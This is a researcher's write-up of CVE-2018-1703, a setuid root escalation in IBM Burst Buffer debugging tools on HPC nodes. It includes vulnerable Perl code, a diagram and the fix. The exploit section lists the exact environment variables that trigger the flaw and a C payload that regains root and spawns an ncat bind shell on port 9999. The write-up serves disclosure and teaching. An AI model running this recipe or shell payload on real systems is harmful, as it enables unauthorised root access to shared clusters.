# CVE-2018-1703: Burst Buffer Setuid Root Escalation

## Overview

Debugging related binaries shipped with older versions of Burst Buffer software are susceptible to privilege escalation.  Burst Buffer is a type of buffer/cache that is available for the pre-staging (and post-staging) of data before and after a scientific job is placed on a compute node. Because simulations at scale are extremely fine-grained, scientific compute jobs will often wait for some time at the beginning of their code execution for data to stream into memory from fast scratch.  Burst Buffering is directed by system-level processes to pre-stage the next job's data onto compute node-local NVMe drives and reduce idle time spent on I/O at the beginning and end of compute jobs. Because this capability can be directed by system-level processes and the scheduler, it is of particular interest from an authentication and trust boundary perspective.

## Links

  - https://github.com/IBM/CAST
  - https://www-01.ibm.com/support/docview.wss?uid=ibm10734239
  - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1703

## Tools and Background Knowledge

  * Linux Command Line Tools
  * find (for finding setuid root binaries!)
  * PERL (yuck)

## Writeup

The Burst Buffer package shipped with several tools related to the Burst Buffer ecosystem. Some of these were used early on in Burst Buffer development to emulate the Burst Buffer `bbproxy` before it was complete so that client side command line tooling could be developed.  These tools were installed by RPMs with the setuid bit set, meaning that users on the system can run these administrative tools and take advantage of any arbitrary code execution flaws within.  Here's an example of the vulnerable perl code that calls the user defined *$bbscript*.  &setupUserEnvrionment();

```
sub phase2
{
    $BADEXITRC = $BADNONRECOVEXITRC;
    &setupUserEnvironment();
    foreach $bbscript (@STGIN)
    {
        bpost("BB: Calling user stage-in script: $bbscript");
        $rc = cmd("$bbscript");
        bpost("BB: User stage-in script exited with $rc", …);
        failureCleanAndExit() if($rc != 0);
    }
}
```

### Diagram
A user logging into the login node can launch an interactive job on compute nodes.  After sshing to a compute node, the stagein_admin command was available to be run and would run user defined code in a context that could escalate to root.

```
                    ┌─────────────────┐   ┌─────────────────────────────────────────────────────────────────┐
                    │   Login Node    │   │                          Compute Node                           │
                    │                 │   │                                     ┌─────────────┐   ┌────────┐│
┌─────────────┐     │                 │   │                  ┌─────────────┐    │ bbtools.pm  │   │  User  ││
│   User @    │   ┌─┴─────┐  ┌──────┐ │ ┌─┴─────┐  ┌──────┐  │stagein_admin│  ┌─┴─────────────┴─┐ │Defined ││
│ Institution ├───▶ sshd  ├──▶ bash ├─┼─▶ sshd  ├──▶ bash ├──▶ (rwsr-xr-x) ├──▶stagein_admin.pl ├─▶  Code  ││
└─────────────┘   └─┬─────┘  └──────┘ │ └─┬─────┘  └──────┘  └─────────────┘  └─────────────────┘ └────────┘│
                    └─────────────────┘   └─────────────────────────────────────────────────────────────────┘
```

### Exploring PERL

One of the things that was nice about this vulnerability is that the perl source code that 'did the stuff' was actually readable (in the rwx sense). In the English sense, it did take a while to put together the appropriate environment variables necessary to hit a vulnerable code path.  Many references to isSetuid (such as this one:)

```
BEGIN
{   
    print "argv[0] = $ARGV[0]\n";
    if(isSetuid())
    {   
        unshift(@INC, '/opt/ibm/bb/scripts/');
    }
```

sprinkle the Perl scripts.  This seems to indicate that awareness of the *setuid==bad* concept, but as a codebase grows during development, it can be very difficult to cross all of the I-s and dot all of the T-s.
### Finding the right combo

After quite a bit of trial and error, tracing perl code and the way that enviornment variables were parsed, this was the magic sequence:

```
$ export LSF_STAGE_STORAGE_MINSIZE=1
$ export LSF_STAGE_JOBID=1337
$ export LSF_STAGE_USER='root'
$ export LSB_HOSTS='h41n07 h41n07'
$ export LSF_STAGE_USER_STAGE_IN=/path/to/shell/executable
```

`LSF_STAGE_STORAGE_MINSIZE` and `LSF_STAGE_JOBID` don't really matter in our case, but if are unset, will result in the perl code bombing. `LSF_STAGE_USER` is important to set as root, although perhaps other users could have been specified and code run as them.  That was not explored. `LSB_HOSTS` must be set to the active set of compute nodes the current job is running under.  Finally, `LSF_STAGE_USER_STAGE_IN` is the script/binary that the burst buffer daemon will use to stage data onto the compute node ahead of the job.  Passing in a binary that opens a listening socket, for instance, is something that we could explore...

### Building the payload

Initially, I used `touch` to demonstrate that my code was running in a privileged context, but the ultimate goal is persistence and a durable shell.  As such, I decided to build netcat for the ppc64le system, start a netcat listener on port 9999 that spawns shell when it's connected to, and then connect to it after running `stagein_admin`.

```
#include <unistd.h>
#include <stdlib.h>

int main( int argc, char **argv ) {

  setuid(0)
  execl("/gpfs/alpinetds/stf002/scratch/uua/ncat", "/gpfs/alpinetds/stf002/scratch/uua/ncat", "-l", "9999", "-e", "/bin/bash", (char *)NULL);

  return 0;

}
```


### Putting it all together

By configuring our environment *just right*, we can provide an executable to the `stagein_admin` command, which will happily run.  Because it does not take enough care to drop privs, we can use setuid(0) to regain them and own the system.

![Recorded exploitation of this Burst Buffer vulnerability](https://github.com/rmadamson/rmadamson/blob/main/writeups/gifs/setuid.gif)


### The fix

The fix for this is to not package setuid binaries when they aren't strictly necessary.  Information about affected versions can be found by following the links at the beginning of this writeup.

## Acknowledgements

This research used resources of the Oak Ridge Leadership Computing Facility at the Oak Ridge National Laboratory, which is supported by the Office of Science of the U.S. Department of Energy under Contract No. DE-AC05-00OR22725.
